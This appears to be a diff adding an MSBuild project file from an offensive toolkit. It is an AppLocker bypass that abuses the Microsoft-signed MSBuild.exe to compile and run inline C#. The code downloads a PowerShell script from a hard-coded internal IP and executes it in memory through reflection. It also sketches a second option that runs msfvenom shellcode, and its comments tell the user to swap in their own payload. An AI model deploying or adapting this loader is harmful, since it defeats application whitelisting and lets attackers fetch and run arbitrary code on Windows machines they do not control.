@@ -1,0 +1,84 @@
+<!--
+  MSBuild AppLocker Bypass
+  ========================
+  MSBuild.exe is a Microsoft-signed build tool that ships with .NET Framework.
+  It can execute inline C# tasks defined inside an XML project file.
+  AppLocker can't block it because it's a trusted Microsoft binary.
+
+  HOW IT WORKS:
+    1. MSBuild parses the XML project file
+    2. Finds <Task> elements containing C# code
+    3. Compiles and executes the C# code in-process
+    4. Your payload runs as a child of MSBuild.exe
+
+  BINARY PATH:
+    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe  (64-bit)
+    C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe    (32-bit)
+
+  RUN:
+    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
+
+  CUSTOMIZE:
+    Replace the URL in Execute() with your payload URL or inline shellcode.
+    The Execute() method is your payload entry point.
+-->
+
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+
+  <!-- Inline task definition — code compiles and runs at build time -->
+  <Target Name="MSBuildBypass">
+    <MSBuildBypassTask />
+  </Target>
+
+  <UsingTask TaskName="MSBuildBypassTask"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+
+    <Task>
+      <!-- Reference any .NET assemblies you need -->
+      <Reference Include="System.Management.Automation" />
+
+      <Code Type="Class" Language="cs">
+      <![CDATA[
+        using System;
+        using System.Net;
+        using System.Reflection;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+
+        public class MSBuildBypassTask : Task
+        {
+            public override bool Execute()
+            {
+                // -----------------------------------------------
+                // OPTION A: Download and execute a PS script
+                // -----------------------------------------------
+                string url = "http://192.168.45.202/payload.ps1";
+                WebClient wc = new WebClient();
+                string ps = wc.DownloadString(url);
+
+                // Load PowerShell via reflection (works in AppLocker context)
+                Assembly asm = Assembly.LoadWithPartialName("System.Management.Automation");
+                Type psType = asm.GetType("System.Management.Automation.PowerShell");
+                object psi = psType.GetMethod("Create", new Type[0]).Invoke(null, null);
+                psType.GetMethod("AddScript", new Type[] { typeof(string) }).Invoke(psi, new object[] { ps });
+                psType.GetMethod("Invoke", new Type[0]).Invoke(psi, null);
+
+                // -----------------------------------------------
+                // OPTION B: Inline shellcode execution
+                // (replace byte array with your msfvenom output)
+                // -----------------------------------------------
+                // byte[] shellcode = new byte[] { 0xfc, 0x48, 0x83, ... };
+                // IntPtr mem = VirtualAlloc(...);
+                // ... (copy shellcode runner from 03-loaders/shellcode-runners/)
+
+                return true;
+            }
+        }
+      ]]>
+      </Code>
+    </Task>
+
+  </UsingTask>
+
+</Project>
